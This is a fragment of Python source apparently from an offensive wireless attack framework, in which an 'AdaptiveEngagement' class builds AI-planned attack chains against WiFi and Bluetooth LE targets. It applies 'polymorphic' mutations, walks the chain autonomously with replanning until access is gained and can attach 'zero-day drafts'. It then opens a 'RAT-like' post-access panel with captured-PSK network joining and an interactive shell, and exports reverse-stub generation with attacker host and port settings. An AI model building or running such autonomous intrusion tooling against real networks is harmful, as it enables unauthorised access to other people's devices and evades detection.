        attach_zero_day: Optional[bool],
    ) -> Dict[str, Any]:
        self.log("[*] Phase plan → polymorphism → attack walk")
        orch = self.orch
        if orch is None:
            return {
                "access": {"achieved": False},
                "error": "orchestrator missing",
                "executed": [],
            }

        # Build AI chain (or legacy), poly-mutate, walk with replan
        report: Dict[str, Any] = {
            "domain": domain, "seed": seed,
            "ai_plan": None, "kb_tools": [],
            "executed": [], "skipped": [],
            "optional_declined": [],
            "ai_chain": None, "ai_chain_source": None,
            "zero_day_drafts": [],
            "access": {"achieved": False, "creds": None, "session_id": None},
            "replans": 0, "auto_until_access": False,
            "adaptive_cycle": cycle,
        }

        # KB tools
        if getattr(orch, "kb", None) is not None:
            try:
                report["kb_tools"] = orch.kb.get_tools_for_domain(domain)[:20]
            except Exception:  # noqa: BLE001
                pass

        steps: List[Dict[str, Any]] = []
        source = "legacy"
        if getattr(orch, "chain_planner", None) is not None:
            try:
                steps, source = orch._build_ai_chain(  # noqa: SLF001
                    domain, seed, report, attach_zero_day=attach_zero_day,
                )
                report["ai_chain"] = steps
                report["ai_chain_source"] = source
                if not steps:
                    steps = orch._build_steps(domain, seed, report)  # noqa: SLF001
                    source = "legacy_fallback"
                    report["ai_chain_source"] = source
            except Exception as e:  # noqa: BLE001
                self.log(f"[!] AI chain build failed: {e}")
                steps = orch._build_steps(domain, seed, report)  # noqa: SLF001
                source = "legacy"
        elif hasattr(orch, "_build_steps"):
            steps = orch._build_steps(domain, seed, report)  # noqa: SLF001
        elif hasattr(orch, "run"):
            orch.run(domain, seed, attach_zero_day=attach_zero_day)
            steps = [{"action": f"{domain}_attack", "tool": "orchestrator"}]

        # Inject polymorphic / target-adaptive mutations
        steps = _poly_mutate_steps(steps, seed, domain, cycle)
        report["ai_chain"] = steps
        report["poly_cycle"] = cycle
        self.log(
            f"[i] chain source={source} steps={len(steps)} poly_cycle={cycle}"
        )

        # Live re-plan walk (until access inside walk; outer cycle retries)
        if getattr(orch, "chain_planner", None) is not None and source != "legacy":
            orch._walk_chain_with_replan(  # noqa: SLF001
                steps, seed, report, domain=domain,
                autonomous=autonomous, attach_zero_day=attach_zero_day,
            )
        elif hasattr(orch, "_walk_static_step"):
            for step in steps:
                orch._walk_static_step(  # noqa: SLF001
                    step, seed, report, autonomous=autonomous,
                )

        orch._maybe_run_gain_access_hooks(  # noqa: SLF001
            domain, seed, report, autonomous=autonomous,
        )
        return report

    def _phase_rat(
        self, domain: str, seed: Dict[str, Any], orch_report: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Open flash RAT-like post-access dashboard with dynamic capabilities."""
        self.log("[*] Phase RAT / post-access dashboard")
        out: Dict[str, Any] = {"ok": False, "domain": domain}
        try:
            caps_preview = self._capability_preview(domain, seed, orch_report)
            out["capabilities"] = caps_preview
            for cap in caps_preview[:12]:
                self.log(
                    f"  [RAT] [{cap.get('risk','?')}] "
                    f"{cap.get('hotkey', '?')} {cap.get('label', '')}"
                )

            # Ensure seed is on report for spawner target field
            orch_report = dict(orch_report)
            orch_report.setdefault("seed", seed)
            orch_report.setdefault("target", seed.get("bssid") or seed.get("address") or "")

            if self.orch is not None and hasattr(self.orch, "_maybe_spawn_post_access_tui"):
                self.orch._maybe_spawn_post_access_tui(  # noqa: SLF001
                    orch_report, autonomous=False,
                )
                out["ok"] = True
                out["spawned"] = True
            else:
                try:
                    from core.post_access_tui.spawner import spawn_post_access_tui
                    ext = getattr(self.orch, "external_terminal", None) if self.orch else None
                    mode = "ble" if domain == "ble" else "full"
                    res = spawn_post_access_tui(
                        orch_report, external_terminal=ext, tui_mode=mode,
                    )
                    out["ok"] = bool(_safe_dict(res).get("ok"))
                    out["spawn"] = res
                    if not out["ok"]:
                        self.log(f"[i] RAT spawn: {_safe_dict(res).get('error')}")
                except Exception as e:  # noqa: BLE001
                    out["error"] = str(e)
                    self.log(f"[!] RAT spawn failed: {e}")
        except Exception as e:  # noqa: BLE001
            out["error"] = str(e)
            self.log(f"[!] RAT phase failed: {e}")
        return out

    def _capability_preview(
        self, domain: str, seed: Dict[str, Any], orch_report: Dict[str, Any]
    ) -> List[Dict[str, str]]:
        """Build dynamic RAT-like options from capabilities gained."""
        access = _safe_dict(orch_report.get("access"))
        items: List[Dict[str, str]] = []

        def _cap_row(cap: Any) -> Dict[str, str]:
            if isinstance(cap, dict):
                return {
                    "id": str(cap.get("action") or cap.get("id") or ""),
                    "hotkey": str(cap.get("hotkey") or ""),
                    "label": str(cap.get("label") or cap.get("name") or ""),
                    "risk": str(cap.get("risk") or "read"),
                }
            return {
                "id": str(getattr(cap, "action", "") or ""),
                "hotkey": str(getattr(cap, "hotkey", "") or ""),
                "label": str(getattr(cap, "label", "") or ""),
                "risk": str(getattr(cap, "risk", "read") or "read"),
            }

        if domain == "wifi":
            try:
                from core.post_access_tui.wifi_panel_capabilities import (
                    WifiPanelState, compute_visible_menu,
                )
                enc = str(seed.get("encryption") or seed.get("enc") or "")
                st = WifiPanelState(
                    adapter=seed.get("interface"),
                    monitor_mode=bool(seed.get("interface")),
                    selected_ap={
                        "bssid": seed.get("bssid"),
                        "ssid": seed.get("ssid"),
                    },
                    selected_ap_encryption=enc,
                    handshake_captured=bool(
                        seed.get("cap_file") or seed.get("pcap") or access.get("creds")
                    ),
                    pcap_path=seed.get("cap_file") or seed.get("pcap"),
                    wordlist_loaded=bool(seed.get("wordlist")),
                )
                if access.get("creds"):
                    items.append({
                        "id": "use_psk", "hotkey": "J",
                        "label": "Use captured PSK / join network",
                        "risk": "intrusive",
                    })
                for m in (compute_visible_menu(st) or [])[:40]:
                    items.append(_cap_row(m))
            except Exception as e:  # noqa: BLE001
                logger.debug("wifi caps preview: %s", e)
                items.append({
                    "id": "wifi_panel", "hotkey": "W",
                    "label": "Open WiFi post-access panel", "risk": "read",
                })
        else:
            try:
                from core.post_access_tui.ble_panel_capabilities import (
                    PanelState, compute_visible_menu,
                )
                services = seed.get("services") or seed.get("uuids") or []
                svc_set = set()
                for s in services:
                    if isinstance(s, str):
                        svc_set.add(s.lower())
                    elif isinstance(s, dict) and s.get("uuid"):
                        svc_set.add(str(s["uuid"]).lower())
                st = PanelState(
                    connected=bool(
                        access.get("session_id") or access.get("achieved")
                    ),
                    address=seed.get("address") or seed.get("addr"),
                    service_uuids=svc_set,
                )
                for m in (compute_visible_menu(st) or [])[:40]:
                    items.append(_cap_row(m))
            except Exception as e:  # noqa: BLE001
                logger.debug("ble caps preview: %s", e)
                items.append({
                    "id": "ble_panel", "hotkey": "B",
                    "label": "Open BLE post-access panel", "risk": "read",
                })

        if access.get("session_id"):
            items.insert(0, {
                "id": "interactive_shell", "hotkey": "!",
                "label": f"Interactive session {access.get('session_id')}",
                "risk": "intrusive",
            })
        if not items:
            items = [{
                "id": "recon_only", "hotkey": "?",
                "label": "Recon-only foothold — continue adaptive chain",
                "risk": "read",
            }]
        return items

    def _guess_lhost(self) -> str:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
            finally:
                s.close()
        except Exception:  # noqa: BLE001
            return "127.0.0.1"


def run_adaptive_engagement(
    orchestrator: Any,
    domain: str,
    seed: Dict[str, Any],
    **kwargs: Any,
) -> Dict[str, Any]:
    """Module-level entry used by TUI screens."""
    eng = AdaptiveEngagement(orchestrator, **{
        k: kwargs.pop(k)
        for k in (
            "catalog_recon_factory", "on_event", "max_cycles",
            "recon_threshold", "attacker_host", "attacker_port",
            "enable_cve_code", "enable_reverse_stubs", "until_access",
        )
        if k in kwargs
    })
    return eng.run(domain, seed, **kwargs)


__all__ = [
    "AdaptiveEngagement",
    "MAX_ENGAGEMENT_CYCLES",
    "DEFAULT_RECON_THRESHOLD",
    "score_recon",
    "generate_reverse_stubs",
    "run_adaptive_engagement",
]
